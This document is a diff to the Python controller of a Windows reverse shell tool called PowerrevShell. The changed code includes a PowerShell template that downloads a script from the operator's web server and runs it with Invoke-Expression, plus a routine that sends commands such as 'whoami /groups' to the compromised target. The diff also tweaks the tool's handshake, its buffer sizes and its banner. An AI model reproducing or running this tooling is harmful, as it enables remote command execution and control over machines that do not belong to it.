@@ -236,7 +236,7 @@ def cmd_loadscript(HOST,WEBPORT,script): #command to load a script from local ma
     cmd = """
 try {
     Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://%s:%i/%s') 2>&1
-    start-sleep -Milliseconds 1000
+    #start-sleep -Milliseconds 1000
     $StreamWriter.WriteLine('[+] %s Loaded Successfully!')
 } catch {
     $message = $_
@@ -345,6 +345,8 @@ def func(conn,file,file_size): #function for the get functionality
                         try:
                             byte_list.append(int(by))
                         except Exception as e:
+                            print("")
+                            print(ar)
                             print(Fore.RED + "[-] " + Fore.RESET + f"Error while saving file.")
                             print(e)
                             return ' '
@@ -361,17 +363,14 @@ def func(conn,file,file_size): #function for the get functionality
 def send_data(conn,cmd,strip=True,file=''): #command to send command to the target machine
     data = ""
     while (True):
-        size = f"[BUFFER] {len(cmd)}"
-        conn.sendall(size.encode()) #send buffer size
-        if (conn.recv(1024).decode() != '[OKSIZE]'): #wait for callback
-            continue
         conn.sendall(cmd.encode()) #send actual command
         if (conn.recv(1024).decode() != '[OKCMD]'): #wait for callback
             continue
-        checksum = f"[CHECKSUM] {hashlib.md5(cmd.encode()).hexdigest()}"
-        conn.sendall(checksum.encode()) # send the checksum
-        if (conn.recv(1024).decode() == '[OKSUM]'): #wait for callback and check errors
-            break
+        else:
+            checksum = f"[CHECKSUM] {hashlib.md5(cmd.encode()).hexdigest()}"
+            conn.sendall(checksum.encode()) # send the checksum
+            if (conn.recv(1024).decode() == '[OKSUM]'): #wait for callback and check errors
+                break
     while (True):
         part = conn.recv(1024).decode()
         data += part
@@ -425,6 +424,10 @@ def server(HOST:str,PORT:int,WEBPORT:int,CHECK_HTTP:bool,CHECK_SMB:bool,SHARE:st
             print("  / /_/ / __ \ | /| / / _ \/ ___/" + Fore.YELLOW + " ___/ _ \ | / /" + Fore.RESET + "\__ \/ __ \/ _ \/ / /") 
             print(" / ____/ /_/ / |/ |/ /  __/ /  " + Fore.YELLOW + "/ /  /  __/ |/ /" + Fore.RESET + "___/ / / / /  __/ / /")  
             print("/_/    \____/|__/|__/\___/_/Fe" + Fore.YELLOW + "/_/lpa\___/|___/" + Fore.RESET + "/____/_/ /_/\___/_/_/")   
+            print("")
+            print("------------------------------------------------------------------")
+            print("      PowerrevShell - Windows reverse shell | Fedami")
+            print("        https://github.com/Fedami/powerrevshell---rev.ps1")
             print("")                                                                                                                                                              
             whoami = send_data(conn,"whoami")
             groups = send_data(conn,"whoami /groups")
@@ -552,7 +555,7 @@ def server(HOST:str,PORT:int,WEBPORT:int,CHECK_HTTP:bool,CHECK_SMB:bool,SHARE:st
                         print_color(data)
                         for b in app:
                             byte.append(str(b))
-                            if (len(byte) >= 4096):
+                            if (len(byte) >= 32768):
                                 l += len(byte)
                                 byte_to_send = ','.join(byte)
                                 byte = []
